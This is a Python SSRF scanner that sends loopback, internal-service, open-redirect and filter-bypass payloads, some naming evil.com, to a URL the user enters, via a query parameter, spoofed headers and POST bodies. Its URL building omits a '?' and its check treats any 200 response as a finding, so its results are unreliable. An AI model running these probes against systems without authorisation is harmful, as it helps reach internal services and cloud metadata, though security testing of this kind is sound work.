import requests
from urllib.parse import urlparse, urlencode

# Define payloads
payloads = {
    "ssrf_server": ["http://127.0.0.1", "http://localhost"],
    "ssrf_backend": ["http://internal-service", "http://database-service"],
    "blacklist_bypass": ["http://127.0.0.1@evil.com", "http://localhost@evil.com"],
    "whitelist_bypass": ["http://whitelisted.com@127.0.0.1", "http://whitelisted.com@localhost"],
    "open_redirect": ["http://vulnerable-site.com/redirect?url=http://evil.com"],
    "partial_urls": ["//localhost", "//127.0.0.1"],
    "urls_in_data": ['{"url": "http://127.0.0.1"}', '<url>http://127.0.0.1</url>'],
    "referer_header": ["http://127.0.0.1", "http://localhost"]
}

# Function to send GET requests to the target URL
def send_request(url, payload, headers=None):
    try:
        response = requests.get(url + payload, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

# Function to check for SSRF vulnerability
def check_ssrf(url):
    for category, payload_list in payloads.items():
        print(f"Testing {category} payloads")
        for payload in payload_list:
            # Encode the payload if necessary
            full_url = url + urlencode({'url': payload})
            print(f"Testing with payload: {payload}")
            
            # Test GET request
            response = send_request(full_url, "")
            if response:
                if analyze_response(response, payload):
                    print(f"Possible SSRF vulnerability detected with payload: {payload}")
                    return
            
            # Test with custom headers
            headers = {'X-Forwarded-For': payload, 'Referer': payload, 'Host': payload}
            response = send_request(full_url, "", headers=headers)
            if response:
                if analyze_response(response, payload):
                    print(f"Possible SSRF vulnerability detected with payload: {payload}")
                    return
            
            # Test with payloads in data (if applicable)
            if category == "urls_in_data":
                headers = {'Content-Type': 'application/json'}
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if response:
                    if analyze_response(response, payload):
                        print(f"Possible SSRF vulnerability detected with payload: {payload}")
                        return
    print("No SSRF vulnerability detected.")

# Function to analyze the response
def analyze_response(response, payload):
    # Simple heuristic: check for common internal network indicators or success status codes
    if "Metadata" in response.text or "169.254.169.254" in response.text or response.status_code == 200:
        return True
    return False

# Main function
def main():
    url = input("Enter the URL to test: ")
    if not urlparse(url).scheme:
        url = "http://" + url

    check_ssrf(url)

if __name__ == "__main__":
    main()
